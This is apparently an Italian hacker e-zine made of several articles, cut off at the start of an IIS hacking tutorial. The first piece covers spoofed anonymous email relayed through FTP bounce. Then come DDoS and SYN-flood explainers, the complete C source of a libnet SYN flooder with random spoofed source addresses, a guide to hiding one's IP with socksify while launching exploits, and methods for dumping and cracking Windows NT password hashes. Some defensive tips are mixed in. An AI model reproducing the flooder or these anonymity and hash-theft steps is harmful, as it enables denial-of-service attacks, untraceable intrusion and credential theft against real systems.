2) il servizio è, come abbiamo appena detto, la posta, cioè SMTP
3) un qualsiasi server SMTP andrà bene; useremo DNS per conoscerne l'IP
   Address (che in questo esempio supponiamo essere 123.45.67.89)

Ora ci colleghiamo al server "base" (FTP) con il client FTP e inviamo
i comandi della FakeMail: HELO, MAIL FROM, ecc.
Adesso useremo Telnet sul server "base" (la porta è sempre 21, fin qui
rimane sempre tutto uguale) e digitiamo PORT 123,45,67,89,0,25 dove
123,45,67,89 è l'IP Address del server che dovrà eseguire il nostro file
(il server di posta), ma con le virgole anziché i punti (questo è il
formato richiesto da FTP), mentre 25 è la porta SMTP.

Infine scriveremo RETR nomedelfileinviato per avviare l'esecuzione dei
comandi. Dopo poco tempo la FakeMail verrà inviata dal server, ma senza un
IP Address che riveli la nostra identità.

NOTA IMPORTANTE: alla fine del file dei comandi bisogna aggiungere circa 60
kilobyte di byte 0, affinché la connessione duri abbastanza e non si
interrompa bruscamente. Per creare tale file basta usare "debug" (sotto DOS)
scrivendo:

DEBUG PROVA <-- noi
File non trovato
-f 100,F000,0 <-- noi
-rcx <-- noi
:0000
EA60 <-- noi
-w <-- noi
Scrittura di EA60 bytes in corso...
-q <-- noi

Ora un file chiamato "PROVA" di dimensioni 60000 byte sarà stato creato.
Se il nostro file dei comandi l'abbiamo chiamato "comandi" (che fantasia...)
scriveremo:

copy /b comandi+prova finale

E un nuovo file, "finale", verrà creato. Questo sarà il file da inviare.

-----------------------------------<END>---------------------------------------


-------------------------------------<3>---------------------------------------
----------------------------------<Evilcry>------------------------------------
---------------------------------<DoS e DDoS>----------------------------------


E-Mail:evilcry@virgilio.it

 **********************************************************************
 Questo Testo è stato tratto da una traduzione e altre mie conoscenze.**
 **********************************************************************

/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/**
Disclaimer: Non mi ritengo assolutamente responsabile di eventuali danni contro di   /*
voi stessi o contro terzi.Io scrivo solo per informare!!!!!                           /*
/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/**

Salve a tutti ragazzi, oggi vi parlerò  dei bellissimi DDOS. Partiamo dall'inizio. Un D.O.S
è un DENIAL OF SERVICE,in pratica Negazione Di Servizio.Di questi DOS, se n'è parlato
moltissimo soprattutto dopo gli attacchi portati a colossi come Yahoo ed Amazon.I DDOS
sono invece Distributed Denial Of Service, cioè Negazione Di Servizio Distribuita,
simile a un DOS solo che è portato a termine da più computers che sono attivati
contemporaneamente da un unico client.I DDOS (come i DOS) non sfruttano delle vulnerabilità,
e sono spesso fatti dalle stesse società (soprattutto quelle che gestiscono affari molto
importanti)per vedere se  la loro rete  sopporta grandi quantità di traffico o se necessita
maggiore larghezza di banda.Il concetto è molto semplice: il server viene inondato (Flood) di
pacchetti senza senso in modo che il server non riesca a gestire (nell'attacco a Yahoo si parlava di
1Gb/seq durante l'attacco!!) e quindi vada in CRASHHHH (heheheh).All'inizio chi si trovava al
client si doveva telnettare ai singoli computers usati per l'attacco,e doveva lanciare a mano
i comandi ad es: ping -f target.

***********<{Funzioni di un DDOS>]}********************

Gli attacchi più moderni non prevedono soltanto il Flood ,ma tentano di sfruttare
le vulnerabilità della rete e nello stesso tempo rendere l'attacco più difficile da scovare.
I moderni DDOS hanno i pacchetti con l'indirizzo sorgente spooffato.Vengono mandati dei
pacchetti IP raw (grezzi)che non sono destinati a una connessione ma che
subiscono un cambiamento dell'ip sorgente,ma che arrivano comunque ad un destinatario,ciò causa
una gran difficoltà nell'essere tracciato (Pensateci un pò.. voi come fareste a trovare
il destinatario? ihihihihih)

[01]*********<{[SYN FLOODING*}>************************

Come abbiamo detto prima , nei moderni attacchi si cerca di sfruttare delle debolezze nei
protocolli,questo è il tipico caso del SYN Flooding che consiste nell'aprire una mezza
connessione,in pratica il client che sta iniziando la connessione non replica il pacchetto con
l'ACK del pacchetto Syn (Ricordate il Three Way Hanshake?? Andate a Studiarvelo!!!
io non ve lo spiego :=).Riempiendo il server con queste "mezze-connessioni", arriverà un certo
punto in cui non il computer potrà accettare più connessioni perché sovraccarico.La conseguenza
di questo attacco è che il server non potrà accettare connessioni per un determinato periodo
né mandare informazioni all'esterno. :-)

[02]*************<{[INTERCETTARE UN DDOS  ATTRAVERSO UN SISTEMA NIDIS>]}**************

I NIDIS sono in grado di intercettare i segnali di un DDOS, a causa delle anomalie
che ci possono essere in una rete durante un attacco.Il traffico che un DDOS produce
può essere di due tipi:
-Il traffico tra il client e i vari servers del DDOS.
-Il traffico del flood trai servers e la vittima.
Vediamo adesso le possibili anomalie che ci possono essere in una rete durante un
attacco:

-[1]Anomalia:Quando l'attaccante deve risolvere il nome dell'host-vittima lascerà in
 giro per la rete varie tracce.I BIND name server loggano le richieste dell'attaccante
 ed è anche possibile mandargli un segnale come KILL,o si può specificare il logging delle
 varie richieste.Se si trova una richiesta PTR prima di un attacco vuol dire che la richiesta
 è stata fatta proprio dall'client che gestisce l'attacco, se invece troviamo tantissime
 richieste PTR sono da imputarsi ai servers che hanno fatto richiesta dell'host target prima
 del DDOS.

-[2]Anomalia:Se sì scansiona l'ammontare della larghezza di banda che occupa un sito
finché non si  arriva ad una soglia limite possiamo ottenere un quadro completo del suo
traffico.O la soglia può essere la misura dell'ammontare dei vari indirizzi di provenienza
del traffico.Questo ci indica che sicuramente sta avvenendo un flood da qualche parte nel
mondo e le regole ACL potrebbero essere implementate sui BACKBONE ROUTERS potrebbero essere
definite lo scheletro di internet,che hanno inoltre il compito di filtrare e rilevare
il traffico.

-[3]Anomalia:Un altro indizio potrebbe essere l'eccessiva grandezza dei pacchetti ICMP.
Normalmente un pacchetto ICPM non è più grande di 64-128 bytes,e i pacchetti UDP che si
usano in una sessione UDP,non superano i 10 bytes.I pacchetti che hanno una maggiore
dimensione potrebbero contenere traffico di controllo, i bersagli criptati e altre
direttive per i server DDOS.

-[4]Anomalia:I packet payload contengono solo dei caratteri alfanumerici (quindi nessun segno
d'interpunzione,o spazi e caratteri di controllo).Da qui si può intuire che il pacchetto
payload è stato encodato in formato BASE64 e perciò i caretteri sono tutti in Base64.
Questi pacchetti sono inviati dal TFN2K nel suo traffico di controllo.Una stringa specifica
del TFN2K consiste in una sequenza di A(AAAA...)...(La puzza di overflow si è forte ihihihi)
nel payload la dimensione del buffer è gonfiata dalla routine di crittazione.Se invece
la codifica BASE64 non è usata, e il payload contiene traffico binario crittato,le A si
diventeranno una sequenza di /0 binari.

-[5]Anomalia:I pacchetti payload contengono solo caratteri binari, high-bit.Mentre ciò potrebbe
essere un trasferimento file(fatta eccezione per il traffico che transita sulle porte 20,21,80
se questa regola è applicata),ma se nel pacchetto non ci sono parti di una normale
traffico e nello stesso tempo non è encodato in BASE64,è un pacchetto anomalo e quindi potrebbe
essere pericoloso.

Bene anche con questo, abbiamo finito!,alla prox ragà

Saluti a :BiGAlex,Cyberdude,XpTerminator,MARSIO,lordvicio,cityhunter,[Evil]
Quequero,AndreaGeddon,i canali #hack #noflyzone #hackmaniaci #crack-it e chi mi sono
involontariamente dimenticato.


Fuck a :Tutti i Lamers,gli esaltati perché sanno usare il netbus,tutti i coglioni che si
incontrano nella rete.

byezzzzzzzzz


-----------------------------------<END>---------------------------------------


-------------------------------------<4>---------------------------------------
----------------------------------<lordvicio>----------------------------------
----------------------------------<SYN Flood>----------------------------------


                    Syn Flood

Lo scopo di un attacco da parte di un cracker non deve
per forza riguardare l'intrusione di un determinato sistema,
ma anche  bloccarne l'attività.
Questi tipi di attacchi sono chiamati DoS (Denial of Service).
Ora, non stiamo a spiegare che tipi di attacchi siano o
come vengano effettuati, ma cercheremo di  capire
come funzionano  e come  evitare di restarne colpiti.
Stiamo parlando dell'attacco più pericoloso chiamato SYN FOOD.
Generalmente, potremmo spiegare questo tipo di intrusione
come attacco che si propone di bloccare temporaneamente il
servizio di rete interessato, riempiendo la coda di backlog,
con una serie imponente di pacchetti Tcp recanti il flag Syn
mandati da una sorgente inesistente (spoofata).
Per capire meglio il tipo di attacco, bisognerebbe avere almeno,
una minima conoscenza sul protocollo Tcp/Ip.

Per prima cosa, cerchiamo di capire come si effettua
una connessione Tcp:

CLIENT ---------  SYN --------> SERVER
CLIENT <------- SYN/ACK ------- SERVER
CLIENT --------   ACK   ------> SERVER

Il client manda un pacchetto Tcp con il flag Syn impostato, il server
risponde con entrambi i flag SYN e ACK impostati ed infine il client
ne rimanda uno con Ack impostato

SYN : usato per creare una connessione
ACK : indica che è valido il campo di Acknowledgement,
ovvero la conferma dei dati ricevutati dal destinatario
(il SYN/ACK mandato dal server)

Il Risultato di questa connessione darà uno stato di
ESTABLISHED

Ora che è stata chiarita come inizializzare una connessione,
possiamo passare a spiegare nel dettaglio l'attacco SYN Flood.

Come già detto, il Syn Flood colpisce gli stacks TCP/Ip ed è
effettuabile da remoto. Nonostante la sua semplicità, è estremamente
potente in quanto ci permette di utilizzare anche lo spoofing.

Cerchiamo di capire meglio cosa di cosa si tratta.
Quando il kernel, riceve un pacchetto Tcp recante il flag SYN,
ovvero il flag iniziale di una connessione, riserva delle
risorse per la gestione della nuova connessione.

A = noi
B = targhet
C = client spoofato

A [SYN spoofato su C] -> B [riceve il SYN]
B [Manda il syn/ack a C] <- C [Manda un RST a B]

Ora cerchiamo di spiegare lo schema.
Il cracker (A), invia il pacchetto Tcp con il flag SYN impostato,
il server (B) a questo punto, risponderà con un pacchetto SYS/ACK e
la sorgente (C) essendo inesistente, a sua volta,  risponderà con un
altro pacchetto Tcp recante il  flag RST impostato. A questo
punto la connessione andrà  in stato di SYN_RECV.
A questo punto, il server si troverà in uno stato di "attesa" e
la connessione viene posta nella coda di baklog,che verrà eliminata solo dopo
un intervallo di tempo, variabile da server a server in base alle
impostazioni di quest'ultimo. Il tempo può variare a da pochi
secondi ad un massimo di 23 minuti.
Per la coda di backlog, essendo relativamente corta, dovrebbero
bastare pochi pacchetti Tcp con SYN impostato ogni pochi secondi,
per rendere inattivo un determinato servizio, perché il sistema
non potrà più allocare altre risorse, se prima non esaurirà
quelle precedenti.

E` di facile intuizione capire  cosa possa accadere quando un
server si trova a dover gestire migliaia di queste connessioni,
che non verranno mai inizializzate.
Come abbiamo visto,  questo attacco è molto pericoloso e si può
attuare anche con connessioni lente e, spoofando gli indi-
rizzi IP sorgenti, diventa difficilissimo risalire al cracker.

Penso che adesso sia tutto fin troppo chiaro..
Ora cerchiamo di capire come prevenire questo tipo di attacco.
La migliore contromisura nel caso sarebbe
quella di implementare l'opzione SYN cookies nel kernel,o nel caso
di kernel recenti ( 2.0.30 o superiori) attivarla.
Questa, grazie al protocollo SYN cookies, denominato challange cifrato,
permette agli utenti autorizzati di continuare la connessione nonostante
la presenza dell'attacco.

[root@NoFlyZone ipv4]# pwd
/proc/sys/net/ipv4

[root@NoFlyZone ipv4]# echo 1 > /proc/sys/net/ipv4/tcp_syncookies

[root@NoFlyZone ipv4]# cat tcp_syncookies
1
[root@NoFlyZone ipv4]#

Ora sono attivi !


Un'altra possibile contromisura, consiste nell'aumentare le
dimensioni della coda di backlog, onde evitare che venga
immediatamente intasata dai SYN,anche se questa costerebbe
impegno di altre risorse al sistema.
Un'ultima contromisura è quella dell'ISD di rete,che
consiste nell'inviare pacchetti RST corrispondenti ai
SYN iniziali per aiutare ad alleggerire la baklog.

Purtroppo, possiamo notare che nessuna di queste contromisure può
darci la sicurezza di fare sogni tranquilli, ma potremmo limitarne
gli effetti,il tutto a caro prezzo!Risorse del sistema e quindi performance.
Questo è uno dei numerosi casi,ai me,che ci fa notare quanto sia insicuro
il protocollo TCP/IP e quindi,quanto sia insicura la rete..

Potete trovare altre notizie interessanti all'url
www.noflyzone-crew.cjb.net.


-Spoofing : attacco classico che sfrutta le debolezze del
            protocollo TCP.
          . Permette di falsare connessioni TCP inesistenti
          . Permette di aggirare autenticazioni basate sul IP
          . Permette di rimanere anonimi


-Coda Backlog : lista particolare in cui gli elementi inseriti
                per primi sono anche i primi ad essere letti


lordvicio
lordvicio@hotmail.com
Founder noflyzone-crew.cjb.net


Mi intrometto un attimo(già che impagino mi prendo sto diritto).
Vi allego un bel sorgente di route sul SynFlood che sfrutta le libnet,così
avete altro materiale da studiare(vedi mio art in seguito). Byezz (CH)

/*
 *  $Id: syn-flood.c,v 1.1.1.1 2000/05/25 00:28:49 route Exp $
 *
 *  Poseidon++ (c) 1996, 1997, 1998, 1999, 2000 daemon9|route <route@infonexus.com>
 *  SYN flooder rewritten for no good reason.  Again as libnet test module.
 *  Copyright (c) 1998, 1999, 2000 Mike D. Schiffman <mike@infonexus.com>
 *  All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 *
 */

#if (HAVE_CONFIG_H)
#include "../../include/config.h"
#endif
#include "../libnet_test.h"

struct t_pack
{
    struct ip ip;
    struct tcphdr tcp;
};


int
main(int argc, char **argv)
{
    u_long dst_ip   = 0;
    u_long src_ip   = 0;
    u_short dst_prt = 0;
    u_short src_prt = 0;
    u_char *cp, *buf;
    int i, c, packet_amt, burst_int, sockfd, burst_amt;

    packet_amt  = 0;
    burst_int   = 0;
    burst_amt   = 1;

    while((c = getopt(argc, argv, "t:a:i:b:")) != EOF)
    {
        switch (c)
        {
            /*
             *  We expect the input to be of the form `ip.ip.ip.ip.port`.  We
             *  point cp to the last dot of the IP address/port string and
             *  then seperate them with a NULL byte.  The optarg now points to
             *  just the IP address, and cp points to the port.
             */
            case 't':
                if (!(cp = strrchr(optarg, '.')))
                {
                    usage(argv[0]);
                    exit(EXIT_FAILURE);
                }
                *cp++ = 0;
                dst_prt = (u_short)atoi(cp);
                if (!(dst_ip = libnet_name_resolve(optarg, 1)))
                {
                    fprintf(stderr, "Bad IP address: %s\n", optarg);
                    exit(EXIT_FAILURE);
                }
                break;

            case 'a':
                packet_amt  = atoi(optarg);
                break;

            case 'i':
                burst_int   = atoi(optarg);
                break;

            case 'b':
                burst_amt   = atoi(optarg);
                break;

            default:
                usage(argv[0]);
                exit(EXIT_FAILURE);
        }
    }

    if (!dst_prt || !dst_ip || !packet_amt)
    {
        usage(argv[0]);
        exit(EXIT_FAILURE);
    }

    if ((sockfd = libnet_open_raw_sock(IPPROTO_RAW)) == -1)
    {
        perror("socket allocation");
        exit(EXIT_FAILURE);
    }

    buf = malloc(LIBNET_TCP_H + LIBNET_IP_H);
    if (!buf)
    {
        perror("No memory for packet header");
        exit(EXIT_FAILURE);
    }
    memset(buf, 0, LIBNET_TCP_H + LIBNET_IP_H);

    libnet_seed_prand();

    for(; burst_amt--;)
    {
        for (i = 0; i < packet_amt; i++)
        {
            libnet_build_ip(LIBNET_TCP_H,
                    0,
                    libnet_get_prand(LIBNET_PRu16),
                    0,
                    libnet_get_prand(LIBNET_PR8),
                    IPPROTO_TCP,
                    src_ip = libnet_get_prand(LIBNET_PRu32),
                    dst_ip,
                    NULL,
                    0,
                    buf);

            libnet_build_tcp(src_prt = libnet_get_prand(LIBNET_PRu16),
                    dst_prt,
                    libnet_get_prand(LIBNET_PRu32),
                    libnet_get_prand(LIBNET_PRu32),
                    TH_SYN,
                    libnet_get_prand(LIBNET_PRu16),
                    0,
                    NULL,
                    0,
                    buf + LIBNET_IP_H);

            libnet_do_checksum(buf, IPPROTO_TCP, LIBNET_TCP_H);

            c = libnet_write_ip(sockfd, buf, LIBNET_TCP_H + LIBNET_IP_H);
            if (c < LIBNET_TCP_H + LIBNET_IP_H)
            {
                fprintf(stderr, "libnet_write_ip\n");
            }
            usleep(250);
            printf("%15s:%5d ------> %15s:%5d\n",
                    libnet_host_lookup(src_ip, 1),
                    ntohs(src_prt),
                    libnet_host_lookup(dst_ip, 1),
                    dst_prt);
        }
        sleep(burst_int);
    }
    free(buf);
    exit(EXIT_SUCCESS);
}


void
usage(u_char *nomenclature)
{
    fprintf(stderr,
        "\n\nusage: %s -t -a [-i -b]\n"
        "\t-t target, (ip.address.port: 192.168.2.6.23)\n"
        "\t-a number of packets to send per burst\n"
        "\t-i packet burst sending interval (defaults to 0)\n"
        "\t-b number packet bursts to send (defaults to 1)\n" , nomenclature);
}


/* EOF */

------------------------------------<END>--------------------------------------

-------------------------------------<5>---------------------------------------
-----------------------------------<[V]lad>------------------------------------
--------------------------------<Sock or Die>----------------------------------

[]                    []
[]    Introduzione    []
[]____________________[]


:-) Hola a tutti voi!! Questa volta imparerete a salvarvi le kiappe
utilizzando il tunnelling coi sock! "E a che cavolo mi serve??? NN ho
manco capito che hai detto!?!?!" direte voi... bhè tanto per capirci
potrete lanciare exploit, programmi, tools o qualsiasi cosa sfrutti i
socket(che utilizzi una rete locale o esterna insomma) nascondendo il
vostro IP! Certo... potrete farlo anche con una shell, ma le shell costano
ed hackarne una senza copertura non è proprio il massimo... se state pensando
ai wingate vi ricordo che con quelli potrete solo telnettarvi... mentre se
seguirete questa guida imparerete a redirigere tutte le connessioni di
un programma ad un socket!

  _____________________
[]                    []
[]Duri di comprendonio[]
[]____________________[]

Come da titolo se siete un poco duretti guardatevi questo schemino e capirete
come funzionerà il tutto

/--------\	           /----------\
| Vostra |  ----------->  |   Server   |
|macchina| <------------  |   vittima  |
\--------/                 \ ---------/

questo è lo schemino che raffigura l'instradamento dei pacchetti quando lanciate
ad esempio un exploit in locale... come vedete raggiungono direttamente la
vittima che può vedere facilmente il vostro IP. (basta un tcpdump)

/--------\	           /----------\               /---------------\
| Vostra | ------------>  |    Sock    |-----------> |     Server      |
|macchina| <-----------   |            |<----------- |     vittima     |
\--------/                 \ ---------/               \---------------/

e questo invece mostra quello che succede usando un sock come copertura.
Il server vittima vedrà quindi l'IP del sock e voi avrete le chiappette
al calduccio... ovviamente se il sock logga tutte le connessioni
possono lo stesso rintracciarvi ma dubito fortemente che se attaccate un
serveruccio che non appartenga a qualche multinazionale o a qualche
governo l'admin spenda i soldi per kiedere ad un sock che sta dall'altra
parte del mondo tutti i log... quindi sarete salvi

 --------------------
[]                  []
[] Tools utilizzati []
[]__________________[]

Allora, per fare questa bella cosuccia vi serve semplicemente
un programmino bello bello che si kiama Dante. Lo trovate
su http://www.inet.no/dante/ oppure (anzi meglio) scaricatevi
l'rpm dal cd di installazione di linux o da www.rpmfind.net
e installatelo facendo "rpm -i nomerpm.rpm" .
Fate attenzione: a voi non serve il Dante Server ma solo il Client.
Se volete leggetevi il manuale del programma per prendere un pò
di confidenza con un "man socks.conf".

 --------------------
[]                  []
[] Configurazione   []
[]__________________[]

Ora che avete installato il client dovete configurarlo. Spero che
abbiate già un sock server... se non lo avete potete cercarlo sulle
numerose liste di sock che trovate con google, oppure con uno scanner di
proxy server tipo proxyhunter... ricordate che la porta default per i sock
è la 1080.

Bene: diventate root e fate:

# vi /etc/socks.conf

andate alla coda del file e scrivete:

route {
       from: 127.0.0.1/0   to: 127.0.0.1/0   via: IP_del_vostro_sock port = 1080
       proxyprotocol: socks_v4
}

ovviamente cambiate la porta se è diversa o il socks_v4 con socks_v5 se il
vostro sock è una versione 5.

ora pigiate ESC e fate ":wq"
 --------------------
[]                  []
[]   Finalmente     []
[]__________________[]

Finalmente potrete lanciare i vostri exploit dormendo sogni tranquilli la
notte...
per fare tutto dovete solo aggiungere un "socksify" al vostro comando.
Ad esempio se dovete lanciare un exploit o un programma invece di fare

# ./nome_exploit_o_nome_programma

fate

#socksify ./nome_exploit_o_nome_programma

facile no??? si anche troppo.... bhè io finito! alla prossima!!!!!!!!


 _____________________________
[]                           []
[]Saluti&Ringraziamenti      []
[]___________________________[]

NoFlyZone Crew, Cyber Brown, lordvicio, pex3, endsub e tutti quelli che ho dimenticato


                     [----------------------------]
	             [ A [V]lad[D]racul production]
	             [  Member of NFZcrew 2002    ]
	             [----------------------------]

------------------------------------<END>--------------------------------------

-------------------------------------<6>--------------------------------------
--------------------------<[G]oGeT[A] & CyBe[R]pUnK>---------------------------
---------------------<Occhio all'Autenticazione di Windows NT>-----------------


**********************************************************************************
** Dalla collaborazione di [G]oGeT[A] and CyBe[R]pUnK siamo lieti di presentarvi**
**                                                                              **
**                  "Occhio all'Autenticazione di Windows NT"                   **
**                                                                              **
**               Caxxo, pare la presentazione d'un film (ehehehe)               **
**                                                                              **
**********************************************************************************


Premessa: Questo è il nostro primo articolo (vero CyBe[R]pUnK? si vero [G]o[G])per
          cui siate clementi ma critici.Per qualsiasi chiarimento o critica mandate
          na mail a: gogetaonline@hotmail.com
                     c_y_b_e_r_p_u_n_k@hotmail.com (che ca@@o di e-mail che ciò) 	

Disclaimer:(la solita porcata ma se deve proprio ?)cmq ricordate che noi
            [G]oGeT[A] and CyBe[R]pUnK non ci riteniamo responsabile per il modo
            in cui verranno utilizzate le informazioni reperibili in quest'articolo.
            Il presente ha infatti un puro scopo informativo.   



Salve ragazzi, tutto cominciò una sera quando dopo aver passato la solita nottata
dietro uno schermo decisi di scrivere un articolo che illustrasse qualche problema
di Windoze.
il giorno dopo tra una chattata ed una rottura de caxxi al lavoro incontrai un tipo
in gamba e ripensando alla sera prima gli proposi: " Perché non scrivere
un bell'articolo che illustri il processo d'autenticazione di Windows NT in modo
da metterne in luce le debolezze e spingere un newbyes, o chiunque fosse interessato
alla sicurezza informatica, a sfruttarle, o a risolverle? ".......e così fù

Sì comincia ....


Windows NT utilizza il metodo di autenticazione Challenge/Response: il server durante
l'autenticazione invia al client un Challenge che viene cifrato utilizzando come chiave
l'hash della password dell'utente. Il Challenge cifrato viene rimandato nuovamente al
server che lo controlla e confronta che sia uguale alla sua copia cifrata con l'hash
dell'utente. Una volta che i controlli sono stati completati può essere effettuato il
logon altrimenti si deve ripetere l'autenticazione se questi non sono andati a buon fine
( 2 utenti con la stessa password hanno anche lo stesso hash nel SAM ).
Su NT il database degli utenti, chiamato SAM ( Security Accounts Manager ), si trova su
%systemroot%\system32\config ed è un file a cui non è possibile accedere quando il sistema
operativo è in esecuzione ( dicono loro :), poi vedremo come accedere ).
Ogni password è crittata due volte e conservata nel database SAM: una compatibile con Lan 
Manager e una con Windows NT.
Il problema della sicurezza relativo a questo tipo di autenticazione è dovuto 
principalmente a Lan Manager.

Vediamo, per sommi capi, come funziona l'attribuzione di una password su NT.

Quando un amministratore di sistemi Windows NT associa una password ad un utente questa
viene cifrata secondo due algoritmi che, come abbiamo già detto, sono " Lan Manager e
Windows NT " e viene conservata nel SAM. L'algoritmo di Lan Manager è quello di cui ci
occuperemo, dati i suoi problemi di sicurezza. Quest'algoritmo non fa altro che prendere
la password, convertirla in caratteri maiuscoli, dividerla, nel caso sia più lunga di
sette caratteri, in due password di sette lettere, cifrare il risultato in DES ed unire
le due password cifrate.
Es: password = michele77 --> MICHELE : 77____ ( _= carattere vuoto ) a questo punto
cifra le 2 password ottenute in DES ed unisce il risultato.
Il problema più grave di Lan Manager ( usato per una questione di compatibilità con
i vecchi sistemi 9x ) sta proprio nella suddivisione in 2 password che possono essere
decrittate separatamente. Per la decrittazione delle password useremo un software ormai
datato ma in ogni modo valido, L0phtCrack che permette di effettuare un attacco ibrido tra
dizionario e brute force sull'hash delle password.

Recuperare l'hash delle password da dare in pasto a L0phtCrack.

Affermavamo che il SAM non è accessibile se il sistema operativo è in esecuzione, vediamo
di smentire quest'affermazione.
Ci sono vari modi per reperire l'hash delle password dal SAM: entrare con un altro sistema
operativo ( se abbiamo l'accesso fisico alla macchina ); copiarlo dalla cartella 
%systemroot%\repair ( poi vedremo cos'è ); utilizzare alcuni programmi che si trovano
in rete; sniffarli direttamente dal cavo ( anche se questa tecnica non interviene sul SAM ).
Per il primo metodo onestamente non c'è molto da dire se non che basta fare il boot
tramite dischetto ed il gioco è fatto ( se è su file system NTFS basta l'utility NTFSDOS ).
L'altro metodo è prendere il SAM direttamente dalla cartella %systemroot%\repair che
è la directory creata quando l'amministratore, o chi per lui, effettua un backup della 
configurazione del sistema.
Il terzo metodo consiste nell'usare determinati programmi reperibili in rete che sono 
in grado di estrarre l'hash delle password direttamente dal SAM anche se l'OS è in
esecuzione. L0phtCrack è in grado di estrarre l'hash nei sistemi NT ( " tool --> dump 
password from registry " ed inserire l'indirizzo della macchina ) che non usano SYSKEY
( miglioramento della cifratura dal service pack 2 ). Nel caso si verifichi questa 
situazione, è possibile usare Pwdump2 che riesce ad aggirare questo tipo di protezione
e, quindi, a recuperare gli hash che potranno essere decrittati con L0phtCrack.
Il quarto ed ultimo metodo è di sniffare una sessione d'autenticazione per ottenere
l'hash della password dell'utente; questo presuppone che abbiamo già accesso alla 
macchina e permesso di scrittura in almeno una directory, in modo da inserire il
programma di sniffing. Reperire questi software è molto semplice, basta fare un 
giro per la rete e trovare quello che più vi piace ( Buttsniffer, Fsniffer, ecc. ).
Una volta sniffata un'autenticazione ( magari dell'utente Administrator :) ) possiamo
sfruttare l'hash tramite un client SMB.
Si noti che, per poter usare Pwdump, è necessario avere accesso in lettura al database
utenti SAM ( o avere privilegio di Administrator ) ma potrebbe anche essere inserito
in una sessione ActiveX o in mail MIME e diventare un pericolo dal Web. 

Non sottovalutate l'hash

Altro problema deriva dalla facilità con la quale può essere effettuato lo "sniffing" 
delle password su ethernet non strutturate. L'hash password può essere utilizzata
direttamente senza conoscere la password originale ( cioè in "chiaro" ). Con uno 
sniffer basta catturare una sessione di autenticazione da utilizzare tramite una
versione opportunamente modificata di un client Samba ( usato per porre in condivisione
risorse ( dischi, stampanti ) che possono essere utilizzate da macchine Windows ).

Proteggere il nostro sistema?!

Abbiamo visto come la maggior parte degli attacchi a NT avviene attraverso la
sottrazione di password e all'accesso remoto ai file di registro da parte di utenti
 anonimi e senza privilegi. L'utilizzo di protocolli poco sicuri e la presenza di bug,
fa di NT un terreno molto fertile per gli hacker, daremo quindi dei suggerimenti per
cercare di proteggere i nostri sistemi e le nostre reti:
* L0phtCrack utilizza la brute force per il password cracking, per rendere difficile
  questo metodo è molto importante utilizzare password di almeno otto caratteri,
  con punteggiatura e caratteri estesi ( non lo fermerà per molto :) ).
* E' opportuno, inoltre, integrare le password di logon con alcuni sistemi di
  autenticazioni basati su token, come SafeWord o SecurID.
* Disabilitare servizi come Alerter, Messenger o altri che non sono necessari alle
  funzionalità del server aiuta a prevenire gli attacchi remoti. 
* Limitare i logon di rete agli utenti privilegiati quando non è necessario aiuta
  a prevenire gli attacchi alle password Administrator.
* Non usare privilegi amministrativi per i servizi che non li richiedono, chiunque
  potrebbe sfruttarli per eseguire codice malevolo sulla vostra macchina.
* Usare passprop.exe ( Microsoft Windows NT Server 4.0 Resource Kit - blocco dell'
  account Administrator ) nel caso in cui l'amministratore deve compiere il logon 
  in modo remoto.
* Attivare l'auditing ( revisione ) per tenere sotto controllo, la quantità di successi 
  e di insuccessi dei logon e dei logoff, della gestione di utenti e gruppi, delle
  variazioni delle politiche di sicurezza, degli eventi di riavvio, chiusura e di sistema.
* Settate permessi il più restrittivi possibili per quanto riguarda il registro di
  configurazione , la directory %systemroot%\system32 e cancellate dopo averne fatto un backup la direktory %systemroot%\repair.
* Tenete sempre aggiornata la vostra macchina con relativi Service Pack ed HotFix.

La lista dei suggerimenti potrebbe continuare per pagine e pagine ma utilizzando le
accortezze descritte sicuramente riuscirete a rendere un po'  più sicuro il vostro 
sistema. ( ahahahahah!!!  :) )
http://www.networkingitalia.it/SECUR/privacy/algocritto.htm (DES)
join #WINADMIN irc.azzurra.org
     #linadmin

[G]oGeT[A] and CyBe[R]pUnK 

------------------------------------<END>--------------------------------------

-------------------------------------<7>--------------------------------------
-----------------------------------<R|Ppy>-------------------------------------
---------------------------------<IIS Hack #1>---------------------------------

0=====||=====||====0 
| IIS Hack - parte1
|  by R|Ppy 26/02/02
0=====||=====||====0 

[INDICE]
0x01-Intro
0x02-Primi passi
0x03-Considerazioni e Svolgimento
0x04-Ringraziementi


============
0x01-Intro


Amici!!!! quanto tempo!!! è passato molto dall'ultimo tutorial è ora che mi 
dia un po' da fare :D

con questo tutorial voglio parlare di ISS hack, le varie differenze di vulnerabilità, 
qualche spunto per i log ecc. ecc. di questo web server microzoz, la chiamerò IIS hack parte 1 sarà
la prima di una serie di tutorial su IIS hack ;)

Come ben sapete quando riuscite ad avere accesso alla root di un server non abbiamo i 
privilegi di administrator ma solo di utente guest perciò non possiamo prelevare 
quello che voglio o fare quello che vogliamo.
Attraverso dei bei gingilli di files che ho trovato in rete si può fare questo:

1- Excalation privilege to Administrator
